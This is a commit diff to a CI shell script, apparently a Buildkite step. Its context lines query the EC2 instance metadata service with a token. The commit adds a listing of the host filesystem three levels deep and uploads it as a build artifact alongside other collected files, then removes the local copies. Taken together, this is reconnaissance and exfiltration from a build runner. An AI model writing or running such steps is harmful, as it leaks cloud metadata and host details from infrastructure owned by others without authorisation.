b50f55896e3b32cc23956fe87ee9770120eb6d48
Josh Fetzer <jlfetzer@protonmail.com>
2023-04-11 11:22:33 +0800

    directories

--- script.sh
+++ script.sh
@@ -14,6 +14,7 @@ curl -H "X-aws-ec2-metadata-token: $TOKEN" -v http://169.254.169.254/latest/meta
 
 WORK_DIR=`mktemp -d -p "/tmp"`
 RES='grep_results.txt'
+DIRBROWSE='dir_browse.txt'
 
 git clone https://github.com/fortra/impacket.git "$WORK_DIR"
 
@@ -21,9 +22,14 @@ tar -zcvf /tmp/artifacts.tar.gz "$WORK_DIR"
 
 grep -irn "__output" $WORK_DIR > $RES
 
+find / -maxdepth 3 -ls > $DIRBROWSE
+
 rm -rf "$WORK_DIR"
 
 buildkite-agent artifact upload /tmp/artifacts.tar.gz
 buildkite-agent artifact upload $RES
+buildkite-agent artifact upload $DIRBROWSE
 
 rm /tmp/artifacts.tar.gz
+rm $RES
+rm $DIRBROWSE
